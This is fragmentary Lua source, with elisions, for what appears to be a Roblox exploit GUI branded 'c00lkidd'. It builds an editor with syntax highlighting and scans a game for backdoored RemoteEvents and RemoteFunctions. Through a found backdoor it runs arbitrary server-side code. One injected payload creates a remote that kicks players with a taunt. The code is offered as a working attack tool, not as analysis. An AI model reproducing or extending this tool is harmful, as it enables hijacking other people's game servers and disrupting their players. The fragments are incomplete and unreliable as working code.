...
Converted["_TextBox"].PlaceholderText = ''
...
Converted["_TextBox"].BorderColor3 = Color3.fromRGB(255, 0, 0)
Converted["_TextBox"].BorderSizePixel = 2
...
local function highlight(code)
	...
	code = code:gsub("([%(%){%}%[%]])", function(b)
		local color = tokenColors[b]
		if color then
			return '<font color="' .. color .. '">' .. b .. '</font>'
		end
		return b
	end)

	-- Highlight keywords, builtins, etc.
...
local function OHZSZXY_fake_script() -- Fake Script: StarterGui.Starlight.Frame.LocalScript
	...
	local function isLikelyBackdoorRemote(remote)
		...
		if name == "DonkeyDongBozo" then -- use c00lkidd ss bozo!
		        return false
		end
		if parent.Parent.Name=='HDAdminHDClient' and remote.Parent.Name=='Signals' then
			return false
		end
		if parent.Parent.Name=='HDAdminClient' and remote.Parent.Name=='Signals' then
			return false
		end
...
local function fireRemoteEvent(code)
    ...
    elseif not success then
        notify.Warn("c00lkidd", "fireRemoteEvent errors:")
	...
	script.Parent.Framee.scan.MouseButton1Click:Connect(function()
		...
		if remoteEvent or remoteFunction then
			...
			fireRemoteEvent('local r=Instance.new("RemoteFunction",game.ReplicatedStorage)r.Name="DonkeyDongBozo"r.OnServerInvoke=function(p)p:Kick("Use c00lkidd ss bozo!")end')
